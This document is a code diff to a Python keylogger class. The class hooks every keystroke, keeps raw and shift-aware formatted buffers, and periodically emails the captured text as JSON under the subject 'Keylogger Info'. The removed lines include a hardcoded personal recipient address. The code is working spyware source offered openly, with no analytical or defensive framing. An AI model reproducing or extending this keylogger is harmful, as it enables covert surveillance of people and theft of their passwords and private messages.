@@ -3,22 +3,40 @@ import time
 from emailer import Emailer
 import json
 
-local_buffer = ""
-recipients = ["bringolfj@hotmail.com"]
 class Keylogger:
     def __init__(self, email: str, password: str) -> None:
         self.email = email
         self.password = password
+        # Local data to use in the email
+        self.local_buffer = ""
+        self.local_buffer_raw = ""
+        self.shift_keys = 0
+        self.special_keys = {'space': ' ', 'shift': '', 'right shift': '', 'enter': '\\n'}
 
     def __handle_key_press(self, event):
         # On key down, add the key to the local buffer
         if event.event_type == "down":
-            self.local_buffer += event.name
+            self.local_buffer_raw += event.name
+            
+            if event.name in self.special_keys:
+                self.local_buffer += self.special_keys[event.name]
+            else:
+                self.local_buffer += event.name.capitalize() if self.shift_keys else event.name
+
+            if event.name == "shift" or event.name ==  'right shift':
+                self.shift_keys += 1
+
+        elif event.event_type == "up":
+            if event.name == "shift" or event.name ==  'right shift':
+                self.shift_keys -= 1
+            
 
     def __email_local_buffer(self, emailer: Emailer) -> bool:
-        # TODO: Add parsing / ai stuff
+        
+        data = {"raw": self.local_buffer_raw, 'formatted': self.local_buffer}
+
         try:
-            emailer.send_email("Keylogger Info", self.local_buffer)
+            emailer.send_email("Keylogger Info", json.dumps(data))
             print("Email sent successfully")
             return True
         except Exception as e:
@@ -27,11 +45,10 @@ class Keylogger:
         finally:
             # Reset the local buffer
             self.local_buffer = ""
+            self.local_buffer_raw = ""
             print("Reset local buffer")
 
     def run(self) -> None:
-        # Local raw data to use in the email
-        self.local_buffer = ""
         keyboard.hook(self.__handle_key_press)
 
         emailer = Emailer(self.email, self.password)
